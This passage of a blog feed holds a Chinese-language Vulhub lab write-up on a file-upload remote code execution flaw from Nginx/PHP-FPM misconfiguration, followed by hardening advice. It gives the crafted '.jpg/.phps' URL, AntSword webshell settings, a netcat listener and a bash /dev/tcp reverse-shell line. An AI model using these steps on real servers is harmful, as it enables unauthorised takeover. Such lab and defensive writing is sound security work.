+&lt;h3 id=&#34;4-触发-RCE&#34;&gt;&lt;a href=&#34;#4-触发-RCE&#34; class=&#34;headerlink&#34; title=&#34;4. 触发 RCE&#34;&gt;&lt;/a&gt;4. 触发 RCE&lt;/h3&gt;&lt;ul&gt;
+&lt;li&gt;访问构造路径：&lt;figure class=&#34;highlight bash&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;code class=&#34;hljs bash&#34;&gt;http://localhost:8080/uploads/1.jpg/.phps&lt;br&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;结果&lt;/strong&gt;：Nginx 将请求交给 PHP-FPM，执行 &lt;code&gt;1.jpg&lt;/code&gt; 中的 PHP 代码。&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h3 id=&#34;5-连接蚁剑&#34;&gt;&lt;a href=&#34;#5-连接蚁剑&#34; class=&#34;headerlink&#34; title=&#34;5. 连接蚁剑&#34;&gt;&lt;/a&gt;5. 连接蚁剑&lt;/h3&gt;&lt;ul&gt;
+&lt;li&gt;&lt;strong&gt;配置&lt;/strong&gt;：&lt;ul&gt;
+&lt;li&gt;&lt;strong&gt;URL&lt;/strong&gt;：&lt;code&gt;http://localhost:8080/uploads/1.jpg/.phps&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;密码&lt;/strong&gt;：&lt;code&gt;cmd&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;类型&lt;/strong&gt;：PHP&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;编码&lt;/strong&gt;：默认&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;功能&lt;/strong&gt;：&lt;ul&gt;
+&lt;li&gt;命令执行（如 &lt;code&gt;whoami&lt;/code&gt;）&lt;/li&gt;
+&lt;li&gt;文件管理（上传、下载）&lt;/li&gt;
+&lt;li&gt;反弹 Shell&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h3 id=&#34;6-反弹-Shell（可选）&#34;&gt;&lt;a href=&#34;#6-反弹-Shell（可选）&#34; class=&#34;headerlink&#34; title=&#34;6. 反弹 Shell（可选）&#34;&gt;&lt;/a&gt;6. 反弹 Shell（可选）&lt;/h3&gt;&lt;ul&gt;
+&lt;li&gt;在 Kali 上启动监听：&lt;figure class=&#34;highlight bash&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;code class=&#34;hljs bash&#34;&gt;nc -lvnp 4444&lt;br&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/li&gt;
+&lt;li&gt;在蚁剑中执行：&lt;figure class=&#34;highlight bash&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;code class=&#34;hljs bash&#34;&gt;bash -i &amp;gt;&amp;amp; /dev/tcp/&amp;lt;你的IP&amp;gt;/4444 0&amp;gt;&amp;amp;1&lt;br&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;hr&gt;
+&lt;h2 id=&#34;六、防御建议&#34;&gt;&lt;a href=&#34;#六、防御建议&#34; class=&#34;headerlink&#34; title=&#34;六、防御建议&#34;&gt;&lt;/a&gt;六、防御建议&lt;/h2&gt;&lt;h3 id=&#34;1-Nginx-配置强化&#34;&gt;&lt;a href=&#34;#1-Nginx-配置强化&#34; class=&#34;headerlink&#34; title=&#34;1. Nginx 配置强化&#34;&gt;&lt;/a&gt;1. Nginx 配置强化&lt;/h3&gt;&lt;ul&gt;
+&lt;li&gt;&lt;strong&gt;限制 PHP 解析&lt;/strong&gt;：&lt;figure class=&#34;highlight nginx&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;code class=&#34;hljs nginx&#34;&gt;&lt;span class=&#34;hljs-section&#34;&gt;location&lt;/span&gt; &lt;span class=&#34;hljs-regexp&#34;&gt;~ \.php$&lt;/span&gt; &amp;#123;&lt;br&gt;    &lt;span class=&#34;hljs-attribute&#34;&gt;fastcgi_pass&lt;/span&gt; &lt;span class=&#34;hljs-number&#34;&gt;127.0.0.1:9000&lt;/span&gt;;&lt;br&gt;    &lt;span class=&#34;hljs-attribute&#34;&gt;include&lt;/span&gt; fastcgi_params;&lt;br&gt;    &lt;span class=&#34;hljs-attribute&#34;&gt;fastcgi_param&lt;/span&gt; SCRIPT_FILENAME /var/www/html&lt;span class=&#34;hljs-variable&#34;&gt;$fastcgi_script_name&lt;/span&gt;;&lt;br&gt;&amp;#125;&lt;br&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;禁止上传目录执行 PHP&lt;/strong&gt;：&lt;figure class=&#34;highlight nginx&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;code class=&#34;hljs nginx&#34;&gt;&lt;span class=&#34;hljs-section&#34;&gt;location&lt;/span&gt; /Uploads/ &amp;#123;&lt;br&gt;    &lt;span class=&#34;hljs-section&#34;&gt;location&lt;/span&gt; &lt;span class=&#34;hljs-regexp&#34;&gt;~ \.php$&lt;/span&gt; &amp;#123;&lt;br&gt;        &lt;span class=&#34;hljs-attribute&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;hljs-number&#34;&gt;403&lt;/span&gt;;&lt;br&gt;    &amp;#125;&lt;br&gt;&amp;#125;&lt;br&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h3 id=&#34;2-PHP-FPM-配置加固&#34;&gt;&lt;a href=&#34;#2-PHP-FPM-配置加固&#34; class=&#34;headerlink&#34; title=&#34;2. PHP-FPM 配置加固&#34;&gt;&lt;/a&gt;2. PHP-FPM 配置加固&lt;/h3&gt;&lt;ul&gt;
+&lt;li&gt;&lt;strong&gt;限制后缀&lt;/strong&gt;：&lt;figure class=&#34;highlight ini&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;code class=&#34;hljs ini&#34;&gt;&lt;span class=&#34;hljs-section&#34;&gt;[www]&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;hljs-attr&#34;&gt;security.limit_extensions&lt;/span&gt; = .php&lt;br&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;检查配置文件&lt;/strong&gt;：&lt;ul&gt;
+&lt;li&gt;路径：&lt;code&gt;/etc/php-fpm.d/www.conf&lt;/code&gt; 或 &lt;code&gt;/etc/php/*/fpm/pool.d/www.conf&lt;/code&gt;。&lt;/li&gt;
+&lt;li&gt;确保不包含 &lt;code&gt;.phps&lt;/code&gt; 或空值。&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h3 id=&#34;3-文件上传校验&#34;&gt;&lt;a href=&#34;#3-文件上传校验&#34; class=&#34;headerlink&#34; title=&#34;3. 文件上传校验&#34;&gt;&lt;/a&gt;3. 文件上传校验&lt;/h3&gt;&lt;ul&gt;
+&lt;li&gt;&lt;strong&gt;内容校验&lt;/strong&gt;：&lt;ul&gt;
+&lt;li&gt;使用 &lt;code&gt;fileinfo&lt;/code&gt; 扩展验证文件真实类型：&lt;figure class=&#34;highlight php&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;code class=&#34;hljs php&#34;&gt;&lt;span class=&#34;hljs-variable&#34;&gt;$finfo&lt;/span&gt; = &lt;span class=&#34;hljs-title function_ invoke__&#34;&gt;finfo_open&lt;/span&gt;(FILEINFO_MIME_TYPE);&lt;br&gt;&lt;span class=&#34;hljs-variable&#34;&gt;$mime&lt;/span&gt; = &lt;span class=&#34;hljs-title function_ invoke__&#34;&gt;finfo_file&lt;/span&gt;(&lt;span class=&#34;hljs-variable&#34;&gt;$finfo&lt;/span&gt;, &lt;span class=&#34;hljs-variable&#34;&gt;$_FILES&lt;/span&gt;[&lt;span class=&#34;hljs-string&#34;&gt;&amp;#x27;file&amp;#x27;&lt;/span&gt;][&lt;span class=&#34;hljs-string&#34;&gt;&amp;#x27;tmp_name&amp;#x27;&lt;/span&gt;]);&lt;br&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;if&lt;/span&gt; (!&lt;span class=&#34;hljs-title function_ invoke__&#34;&gt;in_array&lt;/span&gt;(&lt;span class=&#34;hljs-variable&#34;&gt;$mime&lt;/span&gt;, [&lt;span class=&#34;hljs-string&#34;&gt;&amp;#x27;image/jpeg&amp;#x27;&lt;/span&gt;, &lt;span class=&#34;hljs-string&#34;&gt;&amp;#x27;image/png&amp;#x27;&lt;/span&gt;])) &amp;#123;&lt;br&gt;    &lt;span class=&#34;hljs-keyword&#34;&gt;die&lt;/span&gt;(&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;仅允许上传图片！&amp;quot;&lt;/span&gt;);&lt;br&gt;&amp;#125;&lt;br&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;重命名文件&lt;/strong&gt;：&lt;ul&gt;
+&lt;li&gt;使用随机文件名，避免直接使用用户输入。&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;限制目录权限&lt;/strong&gt;：&lt;ul&gt;
+&lt;li&gt;上传目录（如 &lt;code&gt;/Uploads/&lt;/code&gt;）禁止执行权限：&lt;figure class=&#34;highlight bash&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;code class=&#34;hljs bash&#34;&gt;&lt;span class=&#34;hljs-built_in&#34;&gt;chmod&lt;/span&gt; -R 644 /var/www/html/Uploads&lt;br&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h3 id=&#34;4-WAF-部署&#34;&gt;&lt;a href=&#34;#4-WAF-部署&#34; class=&#34;headerlink&#34; title=&#34;4. WAF 部署&#34;&gt;&lt;/a&gt;4. WAF 部署&lt;/h3&gt;&lt;ul&gt;
+&lt;li&gt;配置 Web 应用防火墙，检测异常路径（如 &lt;code&gt;/.phps&lt;/code&gt;）。&lt;/li&gt;
+&lt;li&gt;拦截包含 PHP 代码的文件上传请求。&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h3 id=&#34;5-日志监控&#34;&gt;&lt;a href=&#34;#5-日志监控&#34; class=&#34;headerlink&#34; title=&#34;5. 日志监控&#34;&gt;&lt;/a&gt;5. 日志监控&lt;/h3&gt;&lt;ul&gt;
+&lt;li&gt;监控 Nginx 和 PHP-FPM 日志，关注异常请求（如 &lt;code&gt;.jpg/.phps&lt;/code&gt;）。&lt;/li&gt;
+&lt;li&gt;定期扫描上传目录，检测可疑文件。&lt;/li&gt;
+&lt;/ul&gt;
+&lt;hr&gt;
+&lt;h2 id=&#34;七、总结&#34;&gt;&lt;a href=&#34;#七、总结&#34; class=&#34;headerlink&#34; title=&#34;七、总结&#34;&gt;&lt;/a&gt;七、总结&lt;/h2&gt;&lt;table&gt;
+&lt;thead&gt;
+&lt;tr&gt;
+&lt;th&gt;项目&lt;/th&gt;
+&lt;th&gt;信息&lt;/th&gt;
+&lt;/tr&gt;
+&lt;/thead&gt;
+&lt;tbody&gt;&lt;tr&gt;
+&lt;td&gt;&lt;strong&gt;漏洞类型&lt;/strong&gt;&lt;/td&gt;
+&lt;td&gt;文件上传 + Nginx&amp;#x2F;PHP-FPM 配置不当&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;&lt;strong&gt;靶场&lt;/strong&gt;&lt;/td&gt;
+&lt;td&gt;Vulhub（Nginx + PHP-FPM）&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;&lt;strong&gt;利用方式&lt;/strong&gt;&lt;/td&gt;
+&lt;td&gt;伪装文件上传 + 路径构造（如 &lt;code&gt;.phps&lt;/code&gt;）&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;&lt;strong&gt;危害&lt;/strong&gt;&lt;/td&gt;
+&lt;td&gt;RCE、服务器完全控制&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;&lt;strong&gt;修复核心&lt;/strong&gt;&lt;/td&gt;
+&lt;td&gt;严格后缀限制、文件校验、权限控制&lt;/td&gt;
+&lt;/tr&gt;
+&lt;/tbody&gt;&lt;/table&gt;
+&lt;p&gt;Nginx 与 PHP-FPM 配置不当导致的文件上传 RCE 漏洞展示了配置缺陷与文件上传校验缺失的严重后果。攻击者通过伪装文件和路径构造，可执行任意代码并接管服务器。开发者应强化 Nginx 和 PHP-FPM 配置，严格校验上传文件，部署 WAF 和监控机制，构建多层次防御体系。&lt;/p&gt;
+&lt;blockquote&gt;
+&lt;p&gt;&lt;strong&gt;免责声明&lt;/strong&gt;：本文内容仅供合法授权的渗透测试和安全研究，严禁用于非法用途！&lt;/p&gt;
+&lt;/blockquote&gt;
+</content>
+        <category term="Web安全" />
+        <category term="Vulhub" />
+        <category term="文件上传" />
+        <category term="RCE" />
+        <category term="Nginx" />
+        <category term="PHP-FPM" />
+        <category term="蚁剑" />
+        <updated>2025-08-05T07:44:09.000Z</updated>
+    </entry>
+</feed>
